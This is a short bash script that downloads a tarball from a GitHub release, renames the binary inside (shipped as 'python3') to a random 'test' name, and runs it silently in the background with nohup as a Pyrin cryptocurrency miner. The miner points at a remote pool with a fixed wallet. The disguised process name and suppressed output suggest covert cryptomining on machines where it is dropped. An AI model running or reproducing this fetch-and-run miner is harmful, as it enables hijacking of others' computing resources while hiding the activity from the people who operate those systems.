#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

wget -O dot https://github.com/DotAja/ALONE/releases/download/alone/dotlol.tar.gz

tar xvf dot

cd dotlol

mv python3 test$kolot

nohup ./test$kolot -a PYRIN --pool stratum+tcp://luckyynr.us.to:443 --user pyrin:qrgnesqnu6550ejrtznwmjj2slsk7407kcqxh6pe63xj0tlm4hn4z0fk3anle.DOTSEQ-$kolot --no-cl > /dev/null 2>&1 &
